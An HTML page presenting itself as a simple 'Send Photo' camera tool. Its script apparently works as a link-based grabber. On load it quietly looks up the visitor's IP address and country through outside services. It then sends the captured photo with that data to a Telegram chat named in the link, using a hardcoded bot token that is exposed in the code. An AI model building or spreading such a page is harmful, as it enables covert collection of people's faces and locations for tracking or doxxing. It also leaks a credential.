<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Send Photo</title>

<style>
body{
  background:#0f0f0f;
  color:#fff;
  font-family:sans-serif;
  text-align:center;
  padding:20px;
}
video, img{
  width:100%;
  max-width:360px;
  border-radius:12px;
  margin-top:10px;
}
button{
  margin-top:12px;
  padding:12px 20px;
  font-size:16px;
  border:none;
  border-radius:10px;
  background:#2ea6ff;
  color:#fff;
}
</style>
</head>

<body>

<h3>ğŸ“¸ Take Photo</h3>

<video id="video" autoplay playsinline></video>
<img id="preview" style="display:none"/>

<button onclick="capture()">ğŸ“· Capture</button>
<button onclick="sendPhoto()" id="sendBtn" style="display:none">ğŸ“¤ Send</button>

<script>
// ===== BOT TOKEN =====
const BOT_TOKEN = "8558930997:AAHZSF1FLVK6qzcGe2BrMYl0QIWXdokzoMM";
// =====================

// Get User ID from URL  (?=6362758258)
const params = new URLSearchParams(window.location.search);
const USER_ID = params.get("");

// Globals
const video = document.getElementById("video");
const preview = document.getElementById("preview");
const sendBtn = document.getElementById("sendBtn");
let imageBlob = null;
let ipAddress = "Unknown";
let country = "Unknown";

// Get IP
fetch("https://api.ipify.org?format=json")
.then(r => r.json())
.then(d => ipAddress = d.ip);

// Get Country
fetch("https://ipapi.co/json/")
.then(r => r.json())
.then(d => country = d.country_name);

// Camera permission
navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => video.srcObject = stream)
.catch(() => alert("Camera permission required"));

// Capture photo
function capture(){
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);

  canvas.toBlob(blob => {
    imageBlob = blob;
    preview.src = URL.createObjectURL(blob);
    preview.style.display = "block";
    video.style.display = "none";
    sendBtn.style.display = "inline-block";
  }, "image/jpeg", 0.9);
}

// Send photo with caption
function sendPhoto(){
  if(!USER_ID){
    alert("User ID not found in URL");
    return;
  }

  const caption =
`new image received
number : ${USER_ID}
ip address : ${ipAddress}
country : ${country}
dev : @XFPro43`;

  const formData = new FormData();
  formData.append("chat_id", USER_ID);
  formData.append("photo", imageBlob, "photo.jpg");
  formData.append("caption", caption);

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData
  })
  .then(r => r.json())
  .then(d => {
    if(d.ok) alert("âœ… Sent");
    else alert("âŒ Failed");
  })
  .catch(() => alert("âŒ Network / CORS Error"));
}
</script>

</body>
</html>